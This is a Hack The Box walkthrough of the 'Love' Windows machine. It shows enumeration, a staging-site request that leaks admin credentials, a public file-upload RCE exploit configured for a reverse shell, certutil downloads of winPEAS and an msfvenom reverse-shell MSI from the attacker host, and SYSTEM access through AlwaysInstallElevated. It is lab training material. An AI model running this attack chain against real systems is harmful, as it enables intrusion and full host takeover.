
#  Love Windows Machine
# https://app.hackthebox.com/machines/Love

```bash
$ ping 10.129.48.103       
PING 10.129.48.103 (10.129.48.103) 56(84) bytes of data.
64 bytes from 10.129.48.103: icmp_seq=2 ttl=127 time=63.0 ms
64 bytes from 10.129.48.103: icmp_seq=3 ttl=127 time=62.4 ms
^C
--- 10.129.48.103 ping statistics ---
5 packets transmitted, 4 received, 20% packet loss, time 4024ms
rtt min/avg/max/mdev = 62.386/62.888/63.406/0.374 ms

```

```bash
$ nmap -sC -sV 10.129.48.103        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-17 08:21 EDT
Nmap scan report for 10.129.48.103
Host is up (0.064s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Voting System using PHP
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-07-17T05:43:22-07:00
| smb2-time: 
|   date: 2024-07-17T12:43:26
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2h41m32s, deviation: 4h02m30s, median: 21m31s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.75 seconds


```
```bash
# Visit: http://10.129.48.103/ to see  Voting System.
# We can't see port 5000.
# We also have subdomain staging.love.htb.

$ sudo su
$ nano /etc/hosts

10.129.48.103   staging.love.htb

# Save
```

```bash
# Visit http://staging.love.htb/

# Click on demo.

http://localhost:5000

# Scanned 500 port for us response:

 Vote Admin Creds admin: @LoveIsInTheAir!!!! 

```

```bash

$ gobuster dir -u http://10.129.48.103/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.48.103/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 340] [--> http://10.129.48.103/images/]
/home.php             (Status: 302) [Size: 0] [--> index.php]
/index.php            (Status: 200) [Size: 4388]
/admin                (Status: 301) [Size: 339] [--> http://10.129.48.103/admin/]
```
```bash
# Let's visit http://10.129.48.103/admin/

# Use credentials admin: @LoveIsInTheAir!!!!

# We logged in http://10.129.48.103/admin/home.php

# Click on user, click on update and we can upload a random file as a photo.

# Search voting system exploit and we found:
Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)

```
```bash
$ wget https://www.exploit-db.com/raw/49445
--2024-07-17 09:20:15--  https://www.exploit-db.com/raw/49445
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]
Saving to: ‘49445’

49445                        [ <=>                              ]   8.59K  --.-KB/s    in 0s      

2024-07-17 09:20:16 (66.1 MB/s) - ‘49445’ saved [8801]

                                                                                                   
$ mv 49445 abc.py

$ gedit abc.py
# --- Edit your settings here ----
IP = "10.129.48.103" # Website's URL
USERNAME = "admin" #Auth username
PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
REV_IP = "10.10.14.55" # Reverse shell IP
REV_PORT = "8888" # Reverse port 
# --------------------------------

INDEX_PAGE = f"http://{IP}/admin/index.php"
LOGIN_URL = f"http://{IP}/admin/login.php"
VOTE_URL = f"http://{IP}/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/images/shell.php"

# Save the code and create listener on another terminal with nc -nvlp 8888

$ python3 abc.py
Start a NC listner on the port you choose above and run...
Logged in
Poc sent successfully

```
```bash
C:\xampp\htdocs\omrs\images>whoami
whoami
love\phoebe

C:\xampp\htdocs\omrs\images>cd ../../../../
cd ../../../../

C:\>dir
dir

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\Users

04/13/2021  06:58 AM    <DIR>          .
04/13/2021  06:58 AM    <DIR>          ..
04/12/2021  03:00 PM    <DIR>          Administrator
04/21/2021  07:01 AM    <DIR>          Phoebe

C:\Users>cd Administrator
cd Administrator
Access is denied.

C:\Users>cd Phoebe
cd Phoebe

C:\Users\Phoebe>dir
dir

C:\Users\Phoebe>cd Desktop
cd Desktop

C:\Users\Phoebe\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\Users\Phoebe\Desktop

04/13/2021  03:20 AM    <DIR>          .
04/13/2021  03:20 AM    <DIR>          ..
07/17/2024  05:32 AM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   4,123,357,184 bytes free

C:\Users\Phoebe\Desktop>type user.txt
type user.txt
3134420ba68331219854da48e65e6211

```
```bash
$ python -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

certutil -urlcache -f http://10.10.14.55/winPEASx64.exe winpeas.exe
certutil -urlcache -f http://10.10.14.55/winPEASx64.exe winpeas.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\Phoebe\Desktop>certutil -urlcache -f http://10.10.14.55/winPEASx64.exe winpeas.exe
certutil -urlcache -f http://10.10.14.55/winPEASx64.exe winpeas.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

:\Users\Phoebe\Desktop>winpeas.exe
winpeas.exe

# The important part we found from winpeas:

 AlwaysInstallElevated set to 1 in HKLM!
 AlwaysInstallElevated set to 1 in HKCU!

# AlwaysInstallElevated is a key that allows any user to install msis as administrator as local system.

```

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.55 LPORT=443 -f msi -o mal.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: mal.msi
                                                                                                   
$ python -m http.server 80                                                               
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
```bash
$ nc -nvlp 443
listening on [any] 443 ...
```
```bash

C:\Users\Phoebe\Desktop>certutil -urlcache -f http://10.10.14.55/mal.msi mal.msi
certutil -urlcache -f http://10.10.14.55/mal.msi mal.msi
****  Online  ****
CertUtil: -URLCache command completed successfully.


C:\Users\Phoebe\Desktop>msiexec /quiet /qn /i mal.msi
msiexec /quiet /qn /i mal.msi

```

```bash
listening on [any] 443 ...
connect to [10.10.14.55] from (UNKNOWN) [10.129.48.103] 55628
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>cd ..
cd ..

C:\Windows>cd ..
cd ..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\

04/21/2021  09:52 AM    <DIR>          Administration
12/07/2019  02:14 AM    <DIR>          PerfLogs
04/21/2021  09:55 AM    <DIR>          Program Files
11/19/2020  12:42 AM    <DIR>          Program Files (x86)
04/13/2021  06:58 AM    <DIR>          Users
04/21/2021  11:45 PM    <DIR>          Windows
04/12/2021  12:27 PM    <DIR>          xampp
               0 File(s)              0 bytes
               7 Dir(s)   4,115,406,848 bytes free

C:\>cd Users         
cd Users

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\Users\Administrator\Desktop

04/13/2021  03:20 AM    <DIR>          .
04/13/2021  03:20 AM    <DIR>          ..
07/17/2024  05:32 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   4,115,390,464 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
ca4d0a75b186fcf747c4cc0ddf3c70f7

```
